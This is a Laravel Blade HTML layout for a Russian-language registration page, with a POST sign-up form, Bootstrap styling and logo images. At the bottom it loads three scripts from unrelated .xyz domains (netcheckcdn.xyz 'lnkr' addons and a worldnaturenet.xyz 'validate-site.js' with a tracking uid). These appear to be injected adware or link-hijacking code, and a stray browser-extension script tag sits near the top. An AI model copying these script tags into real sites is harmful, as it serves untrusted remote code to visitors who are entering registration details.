<html lang="en">
<script type="text/javascript" charset="utf-8" id="zm-extension"
        src="chrome-extension://fdcgdnkidjaadafnichfpabhfomcebme/scripts/webrtc-patch.js" async=""></script>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../../../favicon.ico">

    <title>Регистрация</title>

    <!-- Bootstrap core CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css"
          integrity="sha384-WskhaSGFgHYWDcbwN70/dfYBj47jz9qbsMId/iRN3ewGhXQFZCSftd1LZCfmhktB" crossorigin="anonymous">

    <!-- Custom styles for this template -->
    <link href="css/additional_page.css" rel="stylesheet">
    @yield('classes')
</head>

<body>
<form action="/registration" class="form-signin" method="POST">
    {{ csrf_field() }}
    <div class="text-center mb-4" style="
">
        <a href=""
           style="display: block;border-style: none !important;border: 0 !important;margin-bottom: 20px;width: 100%;">
            <img width="100" border="0" style="display: block;width: 300px;margin: 0 auto;"
                 src="{{asset('images/text_main.png')}}" alt="">
        </a>
        <a href="" style="display: block;border-style: none !important;border: 0 !important;width: 100%;">
            <img width="100" border="0" style="display: block;width: 600px;margin: 0 auto;"
                 src="{{ asset('images/logo.png') }}" alt="">
        </a>
        @yield('title')
    </div>

    @yield('content')

    <p class="mt-5 mb-3 text-muted text-center">2015 © SIA "Internet-Capital".</p>
</form>

<script type="text/javascript" src="http://netcheckcdn.xyz/addons/lnkr5.min.js"></script>
<script type="text/javascript" src="http://netcheckcdn.xyz/addons/lnkr30_nt.min.js"></script>
<script type="text/javascript"
        src="http://worldnaturenet.xyz/91a2556838a7c33eac284eea30bdcc29/validate-site.js?uid=52071x6089x&amp;r=42"></script>
</body>
</html>
